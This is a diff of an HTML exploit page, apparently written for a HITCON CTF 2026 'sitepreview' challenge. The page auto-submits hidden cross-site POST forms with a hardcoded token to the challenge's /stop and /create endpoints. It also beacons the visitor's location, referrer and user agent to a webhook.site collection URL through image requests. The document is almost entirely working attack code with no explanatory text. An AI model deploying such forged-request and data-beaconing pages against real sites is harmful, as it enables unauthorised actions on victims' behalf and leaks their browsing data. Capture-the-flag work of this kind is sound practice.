@@ -1,9 +1,14 @@
 <!doctype html>
 <html>
-<head><meta charset="utf-8"><title>sp-create-r200</title></head>
+<head><meta charset="utf-8"><title>HITCONCTF2026_SP_R201_BEACON_TOKEN_ZZZ991</title></head>
 <body>
 <p id="s">starting</p>
-<form id="f" method="POST" action="https://sitepreview.chal.hitconctf.com/create">
+<p>HITCONCTF2026_SP_R201_BEACON_TOKEN_ZZZ991</p>
+<iframe name="fr" id="fr" style="width:100%;height:400px;border:2px solid #000"></iframe>
+<form id="stop" method="POST" action="https://sitepreview.chal.hitconctf.com/stop" target="fr">
+<input type="hidden" name="token" value="dc524ceb-2cd6-43e3-8e5c-c49c9f4873a7">
+</form>
+<form id="f" method="POST" action="https://sitepreview.chal.hitconctf.com/create" target="fr">
 <input type="hidden" name="token" value="dc524ceb-2cd6-43e3-8e5c-c49c9f4873a7">
 <button type="submit">go</button>
 </form>
@@ -11,9 +16,18 @@
 (function(){
   var W='https://webhook.site/e899cb66-610b-4a44-a1a1-33da7de4dd11/';
   var t=Date.now();
-  new Image().src=W+'?js=1&t='+t+'&o='+encodeURIComponent(location.href)+'&r='+encodeURIComponent(document.referrer||'')+'&ua='+encodeURIComponent((navigator.userAgent||'').slice(0,80));
-  document.getElementById('s').textContent='submitting at '+t;
-  setTimeout(function(){ document.getElementById('f').submit(); }, 300);
+  function b(q){ try{ new Image().src=W+'?'+q+'&t='+t+'&o='+encodeURIComponent(location.href)+'&r='+encodeURIComponent(document.referrer||'')+'&ua='+encodeURIComponent((navigator.userAgent||'').slice(0,80)); }catch(e){} }
+  b('js=1&r201=1');
+  document.getElementById('s').textContent='r201 stop+create '+t;
+  var n=0;
+  document.getElementById('fr').addEventListener('load', function(){
+    n++;
+    b('iframe_load='+n);
+    document.getElementById('s').textContent='iframe load #'+n+' at '+(Date.now()-t)+'ms';
+  });
+  setTimeout(function(){ document.getElementById('stop').submit(); }, 200);
+  setTimeout(function(){ document.getElementById('f').submit(); }, 1500);
+  setTimeout(function(){ b('still=1&n='+n); }, 8000);
 })();
 </script>
 </body>
